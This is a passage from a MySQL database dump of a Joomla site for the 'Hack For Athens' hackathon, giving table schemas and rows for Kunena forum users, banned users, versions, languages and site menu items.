NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(311,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(312,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(313,'',NULL,0,NULL,0,1,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(314,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(315,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(316,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(317,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(318,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(319,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(320,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(321,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(322,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(323,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(324,'',NULL,0,NULL,0,2,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(325,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(326,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(327,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0);
/*!40000 ALTER TABLE `hfa_kunena_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_users_banned`
--

DROP TABLE IF EXISTS `hfa_kunena_users_banned`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_users_banned` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) DEFAULT NULL,
  `ip` varchar(128) DEFAULT NULL,
  `blocked` tinyint(4) NOT NULL DEFAULT '0',
  `expiration` datetime DEFAULT NULL,
  `created_by` int(11) NOT NULL,
  `created_time` datetime NOT NULL,
  `reason_private` text,
  `reason_public` text,
  `modified_by` int(11) DEFAULT NULL,
  `modified_time` datetime DEFAULT NULL,
  `comments` text,
  `params` text,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `ip` (`ip`),
  KEY `expiration` (`expiration`),
  KEY `created_time` (`created_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_users_banned`
--

LOCK TABLES `hfa_kunena_users_banned` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_users_banned` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_kunena_users_banned` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_version`
--

DROP TABLE IF EXISTS `hfa_kunena_version`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_version` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `version` varchar(20) NOT NULL,
  `versiondate` date NOT NULL,
  `installdate` date NOT NULL,
  `build` varchar(20) NOT NULL,
  `versionname` varchar(40) DEFAULT NULL,
  `state` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_version`
--

LOCK TABLES `hfa_kunena_version` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_version` DISABLE KEYS */;
INSERT INTO `hfa_kunena_version` VALUES (1,'2.0.4','2013-01-18','2013-04-03','','Pharmacopoeia',''),(2,'3.0.0','2013-05-15','2013-05-26','','Wanga',''),(3,'3.0.5','2014-03-09','2014-04-14','','Invecchiato','');
/*!40000 ALTER TABLE `hfa_kunena_version` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunenadiscuss`
--

DROP TABLE IF EXISTS `hfa_kunenadiscuss`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunenadiscuss` (
  `content_id` int(11) NOT NULL DEFAULT '0',
  `thread_id` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunenadiscuss`
--

LOCK TABLES `hfa_kunenadiscuss` WRITE;
/*!40000 ALTER TABLE `hfa_kunenadiscuss` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_kunenadiscuss` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_languages`
--

DROP TABLE IF EXISTS `hfa_languages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_languages` (
  `lang_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `lang_code` char(7) NOT NULL,
  `title` varchar(50) NOT NULL,
  `title_native` varchar(50) NOT NULL,
  `sef` varchar(50) NOT NULL,
  `image` varchar(50) NOT NULL,
  `description` varchar(512) NOT NULL,
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `sitename` varchar(1024) NOT NULL DEFAULT '',
  `published` int(11) NOT NULL DEFAULT '0',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`lang_id`),
  UNIQUE KEY `idx_sef` (`sef`),
  UNIQUE KEY `idx_image` (`image`),
  UNIQUE KEY `idx_langcode` (`lang_code`),
  KEY `idx_access` (`access`),
  KEY `idx_ordering` (`ordering`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_languages`
--

LOCK TABLES `hfa_languages` WRITE;
/*!40000 ALTER TABLE `hfa_languages` DISABLE KEYS */;
INSERT INTO `hfa_languages` VALUES (1,'en-GB','English (UK)','English (UK)','en','en','','','','',1,0,1);
/*!40000 ALTER TABLE `hfa_languages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_menu`
--

DROP TABLE IF EXISTS `hfa_menu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_menu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `menutype` varchar(24) NOT NULL COMMENT 'The type of menu this item belongs to. FK to #__menu_types.menutype',
  `title` varchar(255) NOT NULL COMMENT 'The display title of the menu item.',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL COMMENT 'The SEF alias of the menu item.',
  `note` varchar(255) NOT NULL DEFAULT '',
  `path` varchar(1024) NOT NULL COMMENT 'The computed path of the menu item based on the alias field.',
  `link` varchar(1024) NOT NULL COMMENT 'The actually link the menu item refers to.',
  `type` varchar(16) NOT NULL COMMENT 'The type of link: Component, URL, Alias, Separator',
  `published` tinyint(4) NOT NULL DEFAULT '0' COMMENT 'The published state of the menu link.',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '1' COMMENT 'The parent menu item in the menu tree.',
  `level` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'The relative level in the tree.',
  `component_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to #__extensions.id',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to #__users.id',
  `checked_out_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT 'The time the menu item was checked out.',
  `browserNav` tinyint(4) NOT NULL DEFAULT '0' COMMENT 'The click behaviour of the link.',
  `access` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'The access level required to view the menu item.',
  `img` varchar(255) NOT NULL COMMENT 'The image of the menu item.',
  `template_style_id` int(10) unsigned NOT NULL DEFAULT '0',
  `params` text NOT NULL COMMENT 'JSON encoded data for the menu item.',
  `lft` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set lft.',
  `rgt` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set rgt.',
  `home` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Indicates if this menu item is the home or default page.',
  `language` char(7) NOT NULL DEFAULT '',
  `client_id` tinyint(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_client_id_parent_id_alias_language` (`client_id`,`parent_id`,`alias`,`language`),
  KEY `idx_componentid` (`component_id`,`menutype`,`published`,`access`),
  KEY `idx_menutype` (`menutype`),
  KEY `idx_left_right` (`lft`,`rgt`),
  KEY `idx_alias` (`alias`),
  KEY `idx_path` (`path`(255)),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB AUTO_INCREMENT=300 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_menu`
--

LOCK TABLES `hfa_menu` WRITE;
/*!40000 ALTER TABLE `hfa_menu` DISABLE KEYS */;
INSERT INTO `hfa_menu` VALUES (1,'','Menu_Item_Root','root','','','','',1,0,0,0,0,'0000-00-00 00:00:00',0,0,'',0,'',0,181,0,'*',0),(2,'menu','com_banners','Banners','','Banners','index.php?option=com_banners','component',0,1,1,4,0,'0000-00-00 00:00:00',0,0,'class:banners',0,'',1,10,0,'*',1),(3,'menu','com_banners','Banners','','Banners/Banners','index.php?option=com_banners','component',0,2,2,4,0,'0000-00-00 00:00:00',0,0,'class:banners',0,'',2,3,0,'*',1),(4,'menu','com_banners_categories','Categories','','Banners/Categories','index.php?option=com_categories&extension=com_banners','component',0,2,2,6,0,'0000-00-00 00:00:00',0,0,'class:banners-cat',0,'',4,5,0,'*',1),(5,'menu','com_banners_clients','Clients','','Banners/Clients','index.php?option=com_banners&view=clients','component',0,2,2,4,0,'0000-00-00 00:00:00',0,0,'class:banners-clients',0,'',6,7,0,'*',1),(6,'menu','com_banners_tracks','Tracks','','Banners/Tracks','index.php?option=com_banners&view=tracks','component',0,2,2,4,0,'0000-00-00 00:00:00',0,0,'class:banners-tracks',0,'',8,9,0,'*',1),(7,'menu','com_contact','Contacts','','Contacts','index.php?option=com_contact','component',0,1,1,8,0,'0000-00-00 00:00:00',0,0,'class:contact',0,'',11,16,0,'*',1),(8,'menu','com_contact','Contacts','','Contacts/Contacts','index.php?option=com_contact','component',0,7,2,8,0,'0000-00-00 00:00:00',0,0,'class:contact',0,'',12,13,0,'*',1),(9,'menu','com_contact_categories','Categories','','Contacts/Categories','index.php?option=com_categories&extension=com_contact','component',0,7,2,6,0,'0000-00-00 00:00:00',0,0,'class:contact-cat',0,'',14,15,0,'*',1),(10,'menu','com_messages','Messaging','','Messaging','index.php?option=com_messages','component',0,1,1,15,0,'0000-00-00 00:00:00',0,0,'class:messages',0,'',17,22,0,'*',1),(11,'menu','com_messages_add','New Private Message','','Messaging/New Private Message','index.php?option=com_messages&task=message.add','component',0,10,2,15,0,'0000-00-00 00:00:00',0,0,'class:messages-add',0,'',18,19,0,'*',1),(12,'menu','com_messages_read','Read Private Message','','Messaging/Read Private Message','index.php?option=com_messages','component',0,10,2,15,0,'0000-00-00 00:00:00',0,0,'class:messages-read',0,'',20,21,0,'*',1),(13,'menu','com_newsfeeds','News Feeds','','News Feeds','index.php?option=com_newsfeeds','component',0,1,1,17,0,'0000-00-00 00:00:00',0,0,'class:newsfeeds',0,'',23,28,0,'*',1),(14,'menu','com_newsfeeds_feeds','Feeds','','News Feeds/Feeds','index.php?option=com_newsfeeds','component',0,13,2,17,0,'0000-00-00 00:00:00',0,0,'class:newsfeeds',0,'',24,25,0,'*',1),(15,'menu','com_newsfeeds_categories','Categories','','News Feeds/Categories','index.php?option=com_categories&extension=com_newsfeeds','component',0,13,2,6,0,'0000-00-00 00:00:00',0,0,'class:newsfeeds-cat',0,'',26,27,0,'*',1),(16,'menu','com_redirect','Redirect','','Redirect','index.php?option=com_redirect','component',0,1,1,24,0,'0000-00-00 00:00:00',0,0,'class:redirect',0,'',41,42,0,'*',1),(17,'menu','com_search','Basic Search','','Basic Search','index.php?option=com_search','component',0,1,1,19,0,'0000-00-00 00:00:00',0,0,'class:search',0,'',33,34,0,'*',1),(18,'menu','com_weblinks','Weblinks','','Weblinks','index.php?option=com_weblinks','component',0,1,1,21,0,'0000-00-00 00:00:00',0,0,'class:weblinks',0,'',35,40,0,'*',1),(19,'menu','com_weblinks_links','Links','','Weblinks/Links','index.php?option=com_weblinks','component',0,18,2,21,0,'0000-00-00 00:00:00',0,0,'class:weblinks',0,'',36,37,0,'*',1),(20,'menu','com_weblinks_categories','Categories','','Weblinks/Categories','index.php?option=com_categories&extension=com_weblinks','component',0,18,2,6,0,'0000-00-00 00:00:00',0,0,'class:weblinks-cat',0,'',38,39,0,'*',1),(21,'menu','com_finder','Smart Search','','Smart Search','index.php?option=com_finder','component',0,1,1,27,0,'0000-00-00 00:00:00',0,0,'class:finder',0,'',31,32,0,'*',1),(22,'menu','com_joomlaupdate','Joomla! Update','','Joomla! Update','index.php?option=com_joomlaupdate','component',0,1,1,28,0,'0000-00-00 00:00:00',0,0,'class:joomlaupdate',0,'',43,44,0,'*',1),(101,'mainmenu','Home','home','','home','index.php?option=com_content&view=featured','component',1,1,1,22,0,'0000-00-00 00:00:00',0,1,'',0,'{\"featured_categories\":[\"\"],\"layout_type\":\"blog\",\"num_leading_articles\":\"4\",\"num_intro_articles\":\"0\",\"num_columns\":\"1\",\"num_links\":\"4\",\"multi_column_order\":\"\",\"orderby_pri\":\"\",\"orderby_sec\":\"front\",\"order_date\":\"\",\"show_pagination\":\"2\",\"show_pagination_results\":\"1\",\"show_title\":\"\",\"link_titles\":\"\",\"show_intro\":\"\",\"show_category\":\"\",\"link_category\":\"\",\"show_parent_category\":\"\",\"link_parent_category\":\"\",\"show_author\":\"0\",\"link_author\":\"\",\"show_create_date\":\"\",\"show_modify_date\":\"\",\"show_publish_date\":\"\",\"show_item_navigation\":\"\",\"show_vote\":\"\",\"show_readmore\":\"\",\"show_readmore_title\":\"\",\"show_icons\":\"0\",\"show_print_icon\":\"0\",\"show_email_icon\":\"0\",\"show_hits\":\"\",\"show_noauth\":\"\",\"show_feed_link\":\"1\",\"feed_summary\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"Hack For Athens | Athens, Georgia | June 1-2, 2013\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"229\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',29,30,1,'*',0),(153,'mainmenu','Discussion','discussion','','get-involved/discussion','index.php?option=com_kunena&view=home&defaultmenu=153','component',0,197,2,10061,0,'0000-00-00 00:00:00',0,1,'',0,'{\"catids\":\"5\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"219\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',80,97,0,'*',0),(154,'mainmenu','Index','index','','get-involved/discussion/index','index.php?option=com_kunena&view=category&layout=list','component',0,153,3,10061,0,'0000-00-00 00:00:00',0,1,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0}',81,82,0,'*',0),(155,'mainmenu','Recent Topics','recent','','get-involved/discussion/recent','index.php?option=com_kunena&view=topics&mode=replies','component',0,153,3,10061,0,'0000-00-00 00:00:00',0,1,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"topics_catselection\":\"\",\"topics_categories\":\"\",\"topics_time\":720}',83,84,0,'*',0),(156,'mainmenu','New Topic','newtopic','','get-involved/discussion/newtopic','index.php?option=com_kunena&view=topic&layout=create','component',0,153,3,10061,0,'0000-00-00 00:00:00',0,2,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0}',85,86,0,'*',0),(157,'mainmenu','No Replies','noreplies','','get-involved/discussion/noreplies','index.php?option=com_kunena&view=topics&mode=noreplies','component',0,153,3,10061,0,'0000-00-00 00:00:00',0,2,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"topics_catselection\":\"\",\"topics_categories\":\"\",\"topics_time\":-1}',87,88,0,'*',0),(158,'mainmenu','My Topics','mylatest','','get-involved/discussion/mylatest','index.php?option=com_kunena&view=topics&layout=user&mode=default','component',0,153,3,10061,0,'0000-00-00 00:00:00',0,2,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"topics_catselection\":\"1\",\"topics_categories\":\"0\",\"topics_time\":-1}',89,90,0,'*',0),(159,'mainmenu','Profile','profile','','get-involved/discussion/profile','index.php?option=com_kunena&view=user','component',0,153,3,10061,0,'0000-00-00 00:00:00',0,2,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"integration\":1}',91,92,0,'*',0),(160,'mainmenu','Help','help','','get-involved/discussion/help','index.php?option=com_kunena&view=misc','component',0,153,3,10061,0,'0000-00-00 00:00:00',0,3,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"body\":\"This help page is a menu item inside [b]Kunena Menu[\\/b], which allows easy navigation in your forum. \\n\\n You can use Joomla Menu Manager to edit items in this menu. Please go to [b]Administration[\\/b] >> [b]Menus[\\/b] >> [b]Kunena Menu[\\/b] >> [b]Help[\\/b] to edit or remove this menu item. \\n\\n In this menu item you can use Plain Text, BBCode or HTML. If you want to bind article into this page, you may use article BBCode (with article id): [code][article=full]123[\\/article][\\/code] \\n\\n If you want to create your own menu for Kunena, please start by creating [b]Home Page[\\/b] first. In that page you can select default menu item, which is shown when you enter to Kunena.\",\"body_format\":\"bbcode\"}',93,94,0,'*',0),(161,'mainmenu','Search','search','','get-involved/discussion/search','index.php?option=com_kunena&view=search','component',0,153,3,10061,0,'0000-00-00 00:00:00',0,1,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0}',95,96,0,'*',0),(164,'bottommenu','Login','login','','login','index.php?option=com_users&view=login','component',1,1,1,25,0,'0000-00-00 00:00:00',0,1,'',0,'{\"login_redirect_url\":\"\",\"logindescription_show\":\"1\",\"login_description\":\"\",\"login_image\":\"\",\"logout_redirect_url\":\"\",\"logoutdescription_show\":\"1\",\"logout_description\":\"\",\"logout_image\":\"\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"172\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',63,64,0,'*',0),(165,'mainmenu','Logout','logout','','logout','index.php?option=com_quicklogout&view=quicklogout','component',1,1,1,10071,0,'0000-00-00 00:00:00',0,2,'',0,'{\"quick_logout_redirect\":\"101\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"172\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',109,110,0,'*',0),(166,'bottommenu','Register','register','','register','index.php?option=com_users&view=registration','component',1,1,1,25,0,'0000-00-00 00:00:00',0,1,'',0,'{\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"172\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',61,62,0,'*',0),(173,'mainmenu','Sponsor','sponsor','','sponsor','index.php?option=com_b2jcontact&view=b2jcontact&bid=1','component',1,1,1,10229,0,'0000-00-00 00:00:00',0,1,'',0,'{\"component_class_sfx\":\"b2j_contact\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"page_title\":\"\",\"show_page_heading\":0,\"page_heading\":\"\",\"pageclass_sfx\":\"\",\"menu-meta_description\":\"\",\"menu-meta_keywords\":\"\",\"robots\":\"\",\"secure\":0}',107,108,0,'*',0),(174,'mainmenu','Challenges','challenges','','get-involved/challenges','index.php?Itemid=','alias',1,197,2,0,0,'0000-00-00 00:00:00',0,1,'',0,'{\"aliasoptions\":\"211\",\"menu-anchor_title\":\"\",\"menu-anchor_css\":\"\",\"menu_image\":\"\",\"menu_text\":1,\"dropdown_item_subtext\":\"\",\"dropdown_customimage\":\"\",\"dropdown_customicon\":\"\",\"dropdown_customclass\":\"\",\"dropdown_columns\":\"1\",\"dropdown_distribution\":\"even\",\"dropdown_manual_distribution\":\"\",\"dropdown_dropdown_width\":\"\",\"dropdown_column_widths\":\"\",\"dropdown_children_group\":\"0\",\"dropdown_children_type\":\"menuitems\",\"dropdown_modules\":\"229\",\"dropdown_module_positions\":\"\",\"splitmenu_item_subtext\":\"\",\"splitmenu_customimage\":\"\",\"splitmenu_customicon\":\"\",\"splitmenu_customclass\":\"\"}',68,73,0,'*',0),(175,'mainmenu','Datasets','datasets','','get-involved/datasets','index.php?Itemid=','alias',1,197,2,0,0,'0000-00-00 